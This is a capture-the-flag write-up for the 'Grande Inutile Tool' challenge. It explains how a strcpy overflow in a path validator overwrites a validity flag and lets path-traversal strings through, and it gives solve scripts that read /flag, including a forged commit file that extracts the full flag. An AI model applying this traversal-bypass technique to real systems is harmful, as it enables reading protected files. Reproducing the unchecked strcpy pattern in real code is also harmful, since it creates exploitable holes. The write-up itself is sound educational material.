# Grande Inutile Tool

## Description
> *Many friends of mine hate git, so I made a git-like tool for them.*
>
> *The flag can be found at `/flag`.*
>
> *You can get a user here: https://git-service.ctf.pascalctf.it*

**Connection:** `ssh <user>@git.ctf.pascalctf.it -p2222`

**Files:** [git](./orig/git)

## Solution
**TL;DR**: Buffer overflow in `validate_path` bypasses path traversal check. Use `./` padding for path resolution, checkout to `/flag`, then use `branch` to write the flag content to a readable location.

### Vulnerability Analysis

The binary implements a git-like tool with path validation in the `validate_path` function. The function has a buffer overflow vulnerability:

1. **Buffer Layout** (in `validate_path`):
   - `rbp-0x30`: 32-byte buffer
   - `rbp-0x10`: 4-byte validity flag
   - `rbp-0x08`: stack canary

2. **Vulnerable Code Flow**:
   ```c
   int valid = 1;
   if (strstr(path, ".."))  // Check for ".."
       valid = 0;
   strcpy(buffer, path);    // Buffer overflow here!
   return valid;
   ```

3. **Exploitation**: By providing a path longer than 32 bytes, we overflow into the `valid` flag. If bytes 33-36 are non-zero, the function returns "valid" despite containing "..".

4. **Key Insight**: Using `X/../../..` fails because `X` doesn't exist as a directory. Instead, use `./././...` which resolves correctly since `.` always exists.

### Exploit Steps

1. Initialize a repository:
   ```bash
   mygit init
   mygit branch test  # Create initial branch structure
   ```

2. Checkout the flag file using path traversal with `./` padding:
   ```bash
   mygit checkout './././././././../../../../../../flag'
   ```
   - This sets HEAD to point to `/flag`
   - When `commit_current()` is called, it reads `/flag` content as the "commit hash"

3. Create a new branch with path traversal to a writable location:
   ```bash
   mygit branch './././././././././../../../../FLAG'
   ```
   - This writes the current "commit hash" (flag content) to `/home/FLAG`
   - The `branch` command calls `commit_current()` which reads `/flag`
   - Then writes that content to the new branch file

4. Read the flag:
   ```bash
   cat /home/FLAG
   ```

### Solve Script
```bash
#!/bin/bash
# Get credentials from https://git-service.ctf.pascalctf.it
# SSH: ssh user@git.ctf.pascalctf.it -p 2222

mygit init
mygit branch test

# Checkout /flag as a "branch" - this makes commit_current() read /flag
mygit checkout './././././././../../../../../../flag'

# Create branch to writable location - writes flag content there
mygit branch './././././././././../../../../FLAG'

# Read the exfiltrated flag (first 40 bytes due to hash length limit)
cat /home/FLAG
```

### Notes
- The basic exploit only extracts 40 characters due to the commit hash length limit (0x28 bytes)
- For the full flag (44 characters), use the advanced exploit below

### Advanced Exploit - Full Flag Extraction

The basic exploit truncates to 40 bytes because `commit_current()` uses `strncpy(..., 0x28)`. However, we can bypass this by crafting a fake commit file that makes `checkout` read `/flag` via `object_read()` which doesn't truncate.

**Key insight**: When `checkout` restores files from a commit, it:
1. Reads file hash from commit
2. Calls `object_read(hash)` which reads from `.mygit/objects/<hash>`
3. Calls `file_write(filename, content, size)` with FULL content

If we can make the hash contain path traversal (e.g., `../../../../../flag`), `object_read` will read `/flag` directly and write its FULL content.

**Exploit Steps:**

1. Create a fake commit file (`fc`) in your home directory:
```bash
cat > ~/fc << 'EOF'
parent 0000000000000000000000000000000000000000
timestamp 1234567890
message pwned
files 1
../../../../../././././././././././flag FULLFLAG
EOF
```

2. Create a file (`myhead`) containing a path traversal "commit hash" that points to `fc`:
```bash
# From .mygit/commits/, need ../../../ (3 levels) to reach home
# Total must be 33+ chars for overflow: ../../../ + ./ padding + fc
STR="../../../"
for i in {1..14}; do STR="${STR}./"; done
STR="${STR}fc"
printf "%s" "$STR" > ~/myhead  # 39 chars
```

3. Initialize repo and checkout to the fake "branch":
```bash
mkdir exploit && cd exploit
mygit init
mygit branch dummy
# Checkout to ~/myhead using path traversal (34+ chars for overflow)
mygit checkout "././././././././../../../../myhead"
```

4. The checkout process:
   - Reads `~/myhead` as the branch file (path traversal bypasses check)
   - Gets "commit hash" = `../../.././...fc`
   - Reads commit from `.mygit/commits/../../.././...fc` → `~/fc`
   - Parses `fc`, finds file entry with hash `../../../../.././...flag`
   - Calls `object_read("../../../../.././...flag")` → reads `.mygit/objects/../../../../.././...flag` → `/flag`
   - Writes FULL flag content to `FULLFLAG`

5. Read the flag:
```bash
cat ~/exploit/FULLFLAG
```

### Flag
> `pascalCTF{m4ny_fr13nds_0f_m1n3_h4t3_git_btw}`
